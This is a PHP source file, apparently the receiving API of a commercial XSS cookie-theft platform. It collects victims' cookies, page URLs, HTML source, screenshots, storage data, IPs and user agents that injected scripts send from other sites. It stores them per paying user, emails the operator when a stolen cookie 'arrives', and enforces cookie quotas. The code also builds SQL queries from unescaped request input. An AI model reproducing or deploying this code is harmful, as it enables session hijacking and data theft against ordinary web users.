<?php
/**
 * api.php 接口
 * ----------------------------------------------------------------
 * OldCMS,site:http://www.oldcms.com
 */
header("Access-Control-Allow-Origin: *");
if(!defined('IN_OLDCMS')) die('Access Denied');
//include "vendor/autoload.php";
use apanly\BrowserDetector\Browser;
use apanly\BrowserDetector\Os;
use apanly\BrowserDetector\Device;
$id=Val('id','REQUEST');
$imgs=Val('imgs','REQUEST',1);  //411161555 图片XSS     1表单模块    2截屏模块
if($id){
	$db=DBConnect();
	$project=$db->FirstRow("SELECT * FROM ".Tb('project')." WHERE urlKey='{$id}'");
	if(empty($project)) exit();
	$cookienumbers=$db->FirstValue("SELECT COUNT(*) FROM ".Tb('project_content')." WHERE projectId='{$project['id']}' AND allowdel=1");
	if($cookienumbers>500){
		$huiyuan=$db->FirstRow("SELECT huiyuantime,huiyuan,userName,email FROM ".Tb('user')." WHERE id=".$project['userId']);
		if($huiyuan['huiyuantime']<time()){
			$daythree=$db->FirstRow("SELECT * FROM ".Tb('zhaohuipwd')." WHERE userid=".$project['userId']." AND pd=3 limit 2,1 ");
			if($daythree['zhtime']){
					if(getdate($daythree['zhtime'])['year']===getdate(time())['year'] && getdate($daythree['zhtime'])['yday']===getdate(time())['yday']){
						echo "感谢您的关注，您为·普通会员·，您的此项目已满500条cookie，请清空cookie后再次操作。系统今日已经发送3封邮件作为提示，今日不会再次发送邮件提示。";
						exit;
					}
			}
			$executeArr=array(
								'userid'=>$project['userId'],
								'zhuser'=>$huiyuan['userName'],
								'zhpwd'=>$id,
								'zhemail'=>$huiyuan['email'],
								'zhtime'=>time(),
								'pd'=>3
								);
			$db->AutoExecute(Tb('zhaohuipwd'),$executeArr);
			if(empty($huiyuan['email']) || !preg_match('/^(\w+\.)*?\w+@(\w+\.)+\w+$/',$huiyuan['email'])) exit('邮箱格式不正确,不会发送邮件作为通知！');
			SendMail($huiyuan['email'],"XS学习平台紧急通知！","尊敬的{$huiyuan['userName']}，您在平台为普通会员。您平台中的“{$id}”项目已经满500条cookie信息，平台发送此邮件作为紧急通知，现已打到最新cookie但因cookie已满所以无法入库。请抓紧登陆平台删除对应项目中的cookie，使其少于500条。<br>请登陆平台：ld8.me/login/");
			exit();
		}
	}
	//用户提供的content
	$content=array();
	//待接收的key
	$keys=array();
	$serverContent=array();
	/* 模块 begin */
	$moduleIds=array();
	if(!empty($project['modules'])) $moduleIds=json_decode($project['modules']);
	if(!empty($moduleIds)){
		$modulesStr=implode(',',$moduleIds);
		$modules=$db->Dataset("SELECT * FROM ".Tb('module')." WHERE id IN ($modulesStr)");
		if(!empty($modules)){
			foreach($modules as $module){
				if(!empty($module['keys'])) $keys=array_merge($keys,json_decode($module['keys']));
			}	
		}
	}
	/* 模块 end */
	foreach($keys as $key){
		$content[$key]=Val($key,'REQUEST');	
	}
	if($imgs ==1 && isset($content['cookie'])){
		$content['cookie'] = urlencode(StripStr(base64_decode($content['cookie'])));
	}
	if(in_array('toplocation',$keys)){
		$content['toplocation']=!empty($content['toplocation']) ? $content['toplocation'] : $content['location'];
	}
	$judgeCookie=in_array('cookie',$keys) ? true : false;
	$cookieHash = $project['id'];
	/* cookie hash */
	if(isset($content['cookie'])){
		$cookieHash .= '_'.$content['cookie'];
	}
	if(isset($content['location'])){
		$cookieHash .= '_'.$content['location'];
	}
	if(isset($content['toplocation'])){
		$cookieHash .= '_'.$content['toplocation'];
	}
	if(isset($content['duquurl'])){
		$cookieHash .= '_'.$content['duquurl'];
	}
	$cookieHash=md5($cookieHash);
	if(!empty(trim($content['pic-ip'])) && $imgs == 411161555){
		$serverContent['HTTP_USER_AGENT']=$content['pic-agent'];
		$serverContent['REMOTE_ADDR']=$content['pic-ip'];
		$serverContent['IP-ADDR']=urlencode(adders($content['pic-ip']));
		$cookieHash=md5($project['id'].'_'.$content['location'].'_'.$serverContent['HTTP_USER_AGENT'].'_'.$serverContent['REMOTE_ADDR'].'_'.$serverContent['cookie']);
	}else{
		unset($content['pic-ip']);
		unset($content['pic-agent']);
	}
	$cookieExisted=$db->FirstValue("SELECT COUNT(*) FROM ".Tb('project_content')." WHERE projectId='{$project['id']}' AND cookieHash='{$cookieHash}' AND allowdel=1");  //FirstRow  FirstValue
	$result = "";
	if(!$judgeCookie || $cookieExisted<=0){
		if (preg_match('/^(data:\s*image\/(\w+);base64,)/', $content['screenshotpic'], $result)){
			$type = "png";
			$basedir = "/themes/pic/".date("Y-m-d")."/";
			mkdirswjj(dirname(dirname(__FILE__)).$basedir);
			$basedir_file = $basedir.$cookieHash."-".$project['id'].date("h").".".$type;
			if(file_put_contents(dirname(dirname(__FILE__)).$basedir_file, base64_decode(str_replace($result[1], '', $content['screenshotpic'])))){
	     /* 	include(ROOT_PATH.'/source/class/Imgcompress.class.php');
				$source =  dirname(dirname(__FILE__)).$basedir_file;  
				$dst_img = dirname(dirname(__FILE__)).$basedir_file;  
				$percent = 1;  #原图压缩，不缩放，但体积大大降低  
				$image = (new imgcompress($source,$percent))->compressImg($source); */
				$content['screenshotpic'] = urlencode("<a href='../jjm/pic.php?img=..{$basedir_file}' target='_blank' title='点击查看对方网页截图'><img src='..{$basedir_file}' style='width:150px;height:50px;'></a>");
			}else{
				unset($content['screenshotpic']);
			}
		}
		//服务器获取的content
		if($imgs == 411161555){   //图片XSS
			if(empty($content['location'])){
				$content['location'] = $content['toplocation'];
				if(empty($content['location'])){
					exit;
				}
			}
			//$content['HTTP_USER_AGENT'] = Val('agent','GET');
			$serverContent['HTTP_REFERER']=$content['location'];
			$referers=@parse_url($serverContent['HTTP_REFERER']);
			$domain=$referers['host']?$referers['host']: '';
			//$domain=StripStr($domain);
			$content['cookie']=str_replace("----","<br/>",$content['cookie']);
			$content['cookie']=urlencode($content['cookie']);
			$serverContent['imgs']= 411161555;
			unset($content['pic-ip']);
			unset($content['pic-agent']);
		}elseif($imgs == 1){   //表单模块
			if(empty($content['location'])){
				$content['location'] = $content['toplocation'];
				if(empty($content['location'])){
					exit;
				}
			}
			//$content['HTTP_USER_AGENT'] = Val('agent','GET');
			$serverContent['HTTP_REFERER']=$content['location'];
			$referers=@parse_url($serverContent['HTTP_REFERER']);
			$domain=$referers['host']?$referers['host']: '';
			//$domain=StripStr($domain);
			$serverContent['HTTP_USER_AGENT']=$content['agent'];
			$serverContent['REMOTE_ADDR']=$content['ip'];
			$serverContent['IP-ADDR']=urlencode(adders($content['ip']));
			$serverContent['imgs']= 1;
			$content['cookie']=str_replace("----","<br/>",$content['cookie']);
			unset($content['agent']);
		}else{
			$browser = new Browser();
			$os = new Os();
			$device = new Device();
			$sbw = "";
			if($device->getName()!="unknown"){
				$sbw = "<br/>设备为：".$device->getName();
			}
			$dats = "<br/>操作系统：".$os->getName()." ".$os->getVersion()."<br/>浏览器：".$browser->getName()."(版本:".$browser->getVersion().")".$sbw;
			if(isset($content['title']) || isset($content['htmlyuanma'])){
				if(isset($content['title'])){
					$content['title'] = urlencode($content['title']);
				}
			    if(isset($content['htmlyuanma'])){
					$nothttpurl = str_replace('http://','',URL_PROJECT);
					$nothttpurl = str_replace('https://','',$nothttpurl);
					$content['htmlyuanma'] = urlencode(str_replace($nothttpurl,"xxx平台JS代码xxx",$content['htmlyuanma']));
				}
			}
			if(isset($content['cookie'])){
				$content['cookie'] = urlencode($content['cookie']);
			}
			if(isset($content['datastorage'])){
				$content['datastorage'] = urlencode(str_replace("----","<br/>",$content['datastorage']));
			}
			$serverContent['HTTP_REFERER']=$_SERVER['HTTP_REFERER'];
			$referers=@parse_url($serverContent['HTTP_REFERER']);
			$domain=$referers['host']?$referers['host']: '';
			$domain=StripStr($domain);
			$serverContent['HTTP_REFERER']=StripStr($_SERVER['HTTP_REFERER']);
			$serverContent['HTTP_USER_AGENT']=StripStr($_SERVER['HTTP_USER_AGENT']);
			$user_ip=get_ipip();
			$serverContent['REMOTE_ADDR']=StripStr($user_ip);
			$serverContent['IP-ADDR']=urlencode(adders($user_ip).$dats);
			if(isset($content['referrer'])){
				if(strcmp($serverContent['HTTP_REFERER'], $content['referrer']) !== 0){
					$serverContent['HTTP_REFERER'] = $content['referrer'];
				}
				unset($content['referrer']);
			}
			if(isset($content['useragent'])){
				if(strcmp($serverContent['HTTP_USER_AGENT'], $content['useragent']) !== 0){
					$serverContent['HTTP_USER_AGENT'] = $content['useragent'];
				}
				unset($content['useragent']);
			}
		}
		$ipurlblack=$db->Dataset("SELECT * FROM ".Tb('ipurlblack')." WHERE userId='{$project['userId']}' and moduleid='{$project['id']}'");
		if(!empty($ipurlblack)){
				foreach($ipurlblack as $ipurl){
					if(!empty($ipurl['ip']) && !empty($serverContent['REMOTE_ADDR'])){
						if($ipurl['ip']==$serverContent['REMOTE_ADDR']) exit();
					}
					if(!empty($content['toplocation']) && !empty($ipurl['url'])){
						if(strstr($content['toplocation'],$ipurl['url'])) exit();
					}
				}
		}
		unset($content['imgs']);
		$content = array_filter($content);
		$serverContent = array_filter($serverContent);
		$values=array(
			'projectId'=>$project['id'],
			'content'=>JsonEncode($content),
			'serverContent'=>JsonEncode($serverContent),
			'domain'=>$domain,
			'cookieHash'=>$cookieHash,
			'num'=>1,
			'addTime'=>time()
		);
		$db->AutoExecute(Tb('project_content'),$values);

        /* cookie hash */
        $Getcookie= !empty($content['cookie']) ? $content['cookie'] : null;
		//Getcookie在上面的变量里
        $uid = $project['userId'];
        $userInfo = $db->FirstRow("SELECT * FROM ".Tb('user')." WHERE id={$uid}");
		$msg=explode("|",$userInfo['message']);
		if($userInfo['email'] && $msg[0]==1){
			SendMail($userInfo['email'],"xss平台商城已收货","尊敬的".$userInfo['userName']."，您在".URL_ROOT."/login/ 预订的猫饼干<br>Cookie:{$Getcookie}<br>已经到货！货物地址：{$domain}");//Getcookie在上面的变量里
		}

	}else{
		//服务器获取的content
		if($imgs == 411161555){   //图片XSS
			if(empty($content['location'])){
				$content['location'] = $content['toplocation'];
				if(empty($content['location'])){
					exit;
				}
			}
			//$content['HTTP_USER_AGENT'] = Val('agent','GET');
			$serverContent['HTTP_REFERER']=$content['location'];
			$referers=@parse_url($serverContent['HTTP_REFERER']);
			$domain=$referers['host']?$referers['host']: '';
			//$domain=StripStr($domain);
			$content['cookie']=urlencode($content['cookie']);
			$serverContent['imgs']= 411161555;
			$content['cookie']=str_replace("----","<br/>",$content['cookie']);
			unset($content['pic-ip']);
			unset($content['pic-agent']);
		}elseif($imgs == 1){   //表单模块
			if(empty($content['location'])){
				$content['location'] = $content['toplocation'];
				if(empty($content['location'])){
					exit;
				}
			}
			//$content['HTTP_USER_AGENT'] = Val('agent','GET');
			$serverContent['HTTP_REFERER']=$content['location'];
			$referers=@parse_url($serverContent['HTTP_REFERER']);
			$domain=$referers['host']?$referers['host']: '';
			//$domain=StripStr($domain);
			$serverContent['HTTP_USER_AGENT']=$content['agent'];
			$serverContent['REMOTE_ADDR']=$content['ip'];
			$serverContent['IP-ADDR']=urlencode(adders($content['ip']));
			$serverContent['imgs']= 1;
			$content['cookie']=str_replace("----","<br/>",$content['cookie']);
			unset($content['agent']);
		}else{
			$browser = new Browser();
			$os = new Os();
			$device = new Device();
			$sbw = "";
			if($device->getName()!="unknown"){
				$sbw = "<br/>设备为：".$device->getName();
			}
			$dats = "<br/>操作系统：".$os->getName()." ".$os->getVersion()."<br/>浏览器：".$browser->getName()."(版本:".$browser->getVersion().")".$sbw;
			if(isset($content['title']) || isset($content['htmlyuanma'])){
				if(isset($content['title'])){
					$content['title'] = urlencode($content['title']);
				}
			    if(isset($content['htmlyuanma'])){
					$nothttpurl = str_replace('http://','',URL_PROJECT);
					$nothttpurl = str_replace('https://','',$nothttpurl);
					$content['htmlyuanma'] = urlencode(str_replace($nothttpurl,"xxx平台JS代码xxx",$content['htmlyuanma']));
				}
			}
			if(isset($content['cookie'])){
				$content['cookie'] = urlencode($content['cookie']);
			}
			if(isset($content['datastorage'])){
				$content['datastorage'] = urlencode(str_replace("----","<br/>",$content['datastorage']));
			}
			$serverContent['HTTP_REFERER']=$_SERVER['HTTP_REFERER'];
			$referers=@parse_url($serverContent['HTTP_REFERER']);
			$domain=$referers['host']?$referers['host']: '';
			$domain=StripStr($domain);
			$serverContent['HTTP_REFERER']=StripStr($_SERVER['HTTP_REFERER']);
			$serverContent['HTTP_USER_AGENT']=StripStr($_SERVER['HTTP_USER_AGENT']);
			$user_ip=get_ipip();
			$serverContent['REMOTE_ADDR']=StripStr($user_ip);
			$serverContent['IP-ADDR']=urlencode(adders($user_ip).$dats);
		}
		$ipurlblack=$db->Dataset("SELECT * FROM ".Tb('ipurlblack')." WHERE userId='{$project['userId']}' and moduleid='{$project['id']}'");
		if(!empty($ipurlblack)){
				foreach($ipurlblack as $ipurl){
					if(!empty($ipurl['ip']) && !empty($serverContent['REMOTE_ADDR'])){
						if($ipurl['ip']==$serverContent['REMOTE_ADDR']) exit();
					}
					if(!empty($content['toplocation']) && !empty($ipurl['url'])){
						if(strstr($content['toplocation'],$ipurl['url'])) exit();
					}
				}
		}
		unset($content['imgs']);
		$content = array_filter($content);
		$serverContent = array_filter($serverContent);
		$db->Execute("UPDATE ".Tb('project_content')." SET content=".JsonEncode($content).",serverContent=".JsonEncode($serverContent).",num=num+1,updateTime='".time()."' WHERE projectId='{$project['id']}' AND cookieHash='{$cookieHash}'");
	}

	$HTTPREFERER = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
	header("Location:  {$HTTPREFERER} ");
}

?>